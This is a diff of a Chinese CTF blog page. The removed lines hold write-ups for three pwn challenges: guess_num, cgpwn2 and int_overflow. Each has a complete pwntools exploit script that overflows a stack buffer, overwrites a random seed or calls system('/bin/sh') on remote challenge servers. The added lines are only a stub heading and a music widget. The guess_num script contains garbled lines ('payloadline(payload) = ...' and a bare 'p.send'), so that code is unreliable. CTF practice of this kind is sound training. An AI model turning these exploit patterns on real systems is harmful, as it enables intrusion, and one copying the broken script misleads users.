@@ -83,32 +83,20 @@
 
 
 
-<meta name="description" content="自古有一就有二 有二也不一定有三">
+<meta name="description" content="自古有一就有二，有二也不一定有三 毕竟我这么菜，啥时候自闭到退坑了，也不一定">
 <meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
 <meta property="og:title" content="攻防世界自闭之路&lt;二&gt;">
 <meta property="og:url" content="http://yoursite.com/2019/08/23/攻防世界自闭之路二/index.html">
 <meta property="og:site_name" content="chessman">
-<meta property="og:description" content="自古有一就有二 有二也不一定有三">
+<meta property="og:description" content="自古有一就有二，有二也不一定有三 毕竟我这么菜，啥时候自闭到退坑了，也不一定">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/23/mDIyef.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/23/mrpPWq.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/23/mrptTH.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/23/mr9wE4.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/19/m3OUQe.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/19/m3XrnJ.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/19/m3XHAI.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/23/mDrF7q.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/23/mDsEqA.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/23/mDyYOH.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/23/mD6ngS.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/23/mD6ggO.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/23/mDgnmQ.png">
-<meta property="og:updated_time" content="2019-08-23T10:06:28.142Z">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/24/mykjgJ.png">
+<meta property="og:updated_time" content="2019-08-24T12:43:18.311Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="攻防世界自闭之路&lt;二&gt;">
-<meta name="twitter:description" content="自古有一就有二 有二也不一定有三">
-<meta name="twitter:image" content="https://s2.ax1x.com/2019/08/23/mDIyef.png">
+<meta name="twitter:description" content="自古有一就有二，有二也不一定有三 毕竟我这么菜，啥时候自闭到退坑了，也不一定">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/08/24/mykjgJ.png">
 
 
 
@@ -317,8 +305,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-08-23T18:06:28+08:00">
-                2019-08-23
+              <time title="更新于" itemprop="dateModified" datetime="2019-08-24T20:43:18+08:00">
+                2019-08-24
               </time>
             
           </span>
@@ -345,7 +333,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1,065 字
+                  39 字
                 </span>
               
 
@@ -361,7 +349,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  4 分钟
+                  1 分钟
                 </span>
               
             </div>
@@ -382,56 +370,11 @@
       
 
       
-        <p>自古有一就有二</p>
-<p>有二也不一定有三</p>
+        <p>自古有一就有二，有二也不一定有三</p>
+<p>毕竟我这么菜，啥时候自闭到退坑了，也不一定</p>
 <a id="more"></a>
-<h1 id="guess-num"><a href="#guess-num" class="headerlink" title="guess num"></a>guess num</h1><blockquote>
-<p>srand,rand与seed的关系，判断逻辑关系，覆盖seed随机种子</p>
-</blockquote>
-<h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><p> <img src="https://s2.ax1x.com/2019/08/23/mDIyef.png" alt></p>
-<p>嗯，都开了。看起来就是我不会做的题目，退学，回家</p>
-<h2 id="打开ida查看伪代码"><a href="#打开ida查看伪代码" class="headerlink" title="打开ida查看伪代码"></a>打开ida查看伪代码</h2><p>你就能发现这题的结构非常简单，他只有一个main函数有用，然后你过了他这个循环你就能直接拿到flag，但是这个循环就很有毛病了，猜10个随机从0~5的数，每次程序重新跑一次，它就变一次。就像是个负心的男人，总是这么善变（雾）。正常来说是不可能过的，除非你用十年寿命做交换，换十抽全是ssr（醒醒啊，大哥。这不可能的）</p>
-<p>​    <img src="https://s2.ax1x.com/2019/08/23/mrpPWq.png" alt></p>
-<p>然后你就会发现一个你之前没有见过的函数，它长这样</p>
-<p> <img src="https://s2.ax1x.com/2019/08/23/mrptTH.png" alt></p>
-<p>这个随机数函数，是可以被控制的，同时seed随机种子的地址与v8相连（数据段var_30）覆盖seed的值，使得随机数变成可知</p>
-<p><img src="https://s2.ax1x.com/2019/08/23/mr9wE4.png" alt></p>
-<p>则<code>payload = 填充v8数据段0x20 + 赋给seed的值</code></p>
-<p>但是我们需要在exp中加入c语言函数srand与rand。在交互payload之后，用函数确定随机的值。</p>
-<p>关于调用函数下边有链接，可以自己看看。然后直接用</p>
-<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span> </span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"120.77.219.21"</span>,<span class="number">1241</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Your name:"</span>)</span><br><span class="line"></span><br><span class="line">payloadline(payload) = <span class="number">0x20</span> * <span class="string">'A'</span> + p64(<span class="number">1</span>)</span><br><span class="line">p.send</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">"number:"</span>,str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))	</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://blog.csdn.net/lianghui0811/article/details/76480664" target="_blank" rel="noopener">rand和srand函数的使用</a></p>
-<p><a href="https://blog.csdn.net/weixin_45342712/article/details/96995179" target="_blank" rel="noopener"><strong>python调用C的函数</strong></a></p>
-<h1 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h1><blockquote>
-<p>ROP绕过nx</p>
-</blockquote>
-<h2 id="查看开启的保护"><a href="#查看开启的保护" class="headerlink" title="查看开启的保护"></a>查看开启的保护</h2><p>程序没有/bin/sh,通过name写入/bin/sh的位置。<br>/bin/sh的地址就为name的地址<br><img src="https://s2.ax1x.com/2019/08/19/m3OUQe.png" alt></p>
-<p>NX是打开的，所以不能利用栈，</p>
-<h2 id="查看程序伪代码"><a href="#查看程序伪代码" class="headerlink" title="查看程序伪代码"></a>查看程序伪代码</h2><p><img src="https://s2.ax1x.com/2019/08/19/m3XrnJ.png" alt></p>
-<p>能够利用的gets为name和s两个值。通过<br><img src="https://s2.ax1x.com/2019/08/19/m3XHAI.png" alt></p>
-<p>可知s的偏移地址为0x26<br>由此可得<code>payload = 0x26位填充s变量 + 0x4位覆盖EBP + system()函数地址 + 0x4位任意返回地址 + name常量地址</code>写出exp</p>
-<h2 id="完整的exp脚本为"><a href="#完整的exp脚本为" class="headerlink" title="完整的exp脚本为"></a>完整的exp脚本为</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = remote(<span class="string">"111.198.29.45"</span>,<span class="number">46049</span>)</span><br><span class="line"></span><br><span class="line">shadd = <span class="number">0x0804A080</span></span><br><span class="line">sys = <span class="number">0x08048420</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x26</span>*<span class="string">'a'</span>+<span class="number">0x04</span>*<span class="string">'a'</span>+p32(sys)+<span class="string">'a'</span>*<span class="number">0x04</span>+p32(shadd)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">"\n"</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"\n"</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="string"><a href="#string" class="headerlink" title="string"></a>string</h1><h1 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h1><blockquote>
-<p>整形溢出 构造ROP链</p>
-<p>retlibc2重复利用</p>
-</blockquote>
-<h2 id="查看保护-1"><a href="#查看保护-1" class="headerlink" title="查看保护"></a>查看保护</h2><p>在只开启了NX和RELRO的条件下，利用ROP链。</p>
-<p> <img src="https://s2.ax1x.com/2019/08/23/mDrF7q.png" alt></p>
-<h2 id="打开ida查看伪代码-1"><a href="#打开ida查看伪代码-1" class="headerlink" title="打开ida查看伪代码"></a>打开ida查看伪代码</h2><p>先运行代码</p>
-<p> <img src="https://s2.ax1x.com/2019/08/23/mDsEqA.png" alt></p>
-<p>程序只有输入1之后才可以继续输入，然后输入字符串，能拿到的溢出输入也是在login函数里面，所以直接观察login函数以及check_passwd函数</p>
-<p> <img src="https://s2.ax1x.com/2019/08/23/mDyYOH.png" alt></p>
-<p> <img src="https://s2.ax1x.com/2019/08/23/mD6ngS.png" alt></p>
-<p>题目中限制了密码的长度是在4~8（也就是<code>v3 &lt;= 3u || v3 &gt; 8u</code>）之间的，但是需要覆盖的dest内存为0x14。</p>
-<p>·<img src="https://s2.ax1x.com/2019/08/23/mD6ggO.png" alt></p>
-<p>这里需要引入一个叫做整形溢出的概念，在main函数中我们已知v3是8为字节数，也就是255位的数，正常来说，也就是在一般条件下。我们输入的字节是不会大于这个数的。但是，在极端条件下，人为的输入过长的字符串已经超过了255个字节，例如256个字节，程序就会认为我们输入的数为0个字节，但是程序还是会对总长为266的字符串产生出结果，达到我们想要的目的。也就是相当于一个人转了360度，朝向的方向还是相同的。</p>
-<p>在这个题目当中，限定了输入的长度（4~8）。我们输入完payload之后，溢出v3这个整形数据到259~263之间。</p>
-<p>就能绕过限制密码长度的这个判定了</p>
-<p>由于题目中拥有直接的cat flag，那么就只有把函数溢出然后ret到这个地址就可以了。</p>
-<p> <img src="https://s2.ax1x.com/2019/08/23/mDgnmQ.png" alt></p>
-<p>所以<code>payload = 覆盖dest0x14 + 覆盖EBP0x04 +system（“/bin/sh”）函数的地址 + 填充数据到字节为260的值</code></p>
-<h2 id="完整的exp为"><a href="#完整的exp为" class="headerlink" title="完整的exp为"></a>完整的exp为</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">50638</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choice"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"username"</span>,<span class="string">"awd"</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x14</span>+<span class="number">0x04</span>)*<span class="string">'a'</span> + p32(<span class="number">0x0804868B</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'passwd'</span>,payload.ljust(<span class="number">260</span>,<span class="string">"A"</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1>
+<h1 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h1><h2 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h2><p> <img src="https://s2.ax1x.com/2019/08/24/mykjgJ.png" alt></p>
+
       
     </div>
     
@@ -616,7 +559,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#guess-num"><span class="nav-number">1.</span> <span class="nav-text">guess num</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看保护"><span class="nav-number">1.1.</span> <span class="nav-text">查看保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#打开ida查看伪代码"><span class="nav-number">1.2.</span> <span class="nav-text">打开ida查看伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整exp"><span class="nav-number">1.3.</span> <span class="nav-text">完整exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文档"><span class="nav-number">1.4.</span> <span class="nav-text">参考文档</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cgpwn2"><span class="nav-number">2.</span> <span class="nav-text">cgpwn2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看开启的保护"><span class="nav-number">2.1.</span> <span class="nav-text">查看开启的保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查看程序伪代码"><span class="nav-number">2.2.</span> <span class="nav-text">查看程序伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整的exp脚本为"><span class="nav-number">2.3.</span> <span class="nav-text">完整的exp脚本为</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#string"><span class="nav-number">3.</span> <span class="nav-text">string</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#int-overflow"><span class="nav-number">4.</span> <span class="nav-text">int_overflow</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看保护-1"><span class="nav-number">4.1.</span> <span class="nav-text">查看保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#打开ida查看伪代码-1"><span class="nav-number">4.2.</span> <span class="nav-text">打开ida查看伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整的exp为"><span class="nav-number">4.3.</span> <span class="nav-text">完整的exp为</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level3"><span class="nav-number">5.</span> <span class="nav-text">level3</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dice-game"><span class="nav-number">1.</span> <span class="nav-text">dice_game</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#检查保护"><span class="nav-number">1.1.</span> <span class="nav-text">检查保护</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -625,7 +568,10 @@
       
 
       
-
+<div id="music163player">
+    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="280" height="86" src="//music.163.com/outchain/player?type=2&id=38358214&auto=0&height=66">
+    </iframe>
+</div>
     </div>
   </aside>
 
@@ -650,7 +596,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">3.8k</span>
+    <span title="Site words total count">4.3k</span>
   
 </div>
 
